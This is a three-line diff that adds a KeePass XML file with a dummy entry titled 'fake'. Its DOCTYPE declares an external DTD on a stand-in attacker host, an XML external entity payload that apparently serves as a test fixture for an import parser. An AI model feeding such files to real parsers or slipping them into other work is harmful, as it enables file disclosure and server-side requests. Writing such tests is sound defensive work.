@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE KeePassFile SYSTEM "https://attacker.example/evil.dtd">
+<KeePassFile><Root><Group><Entry><String><Key>Title</Key><Value>fake</Value></String></Entry></Group></Root></KeePassFile>
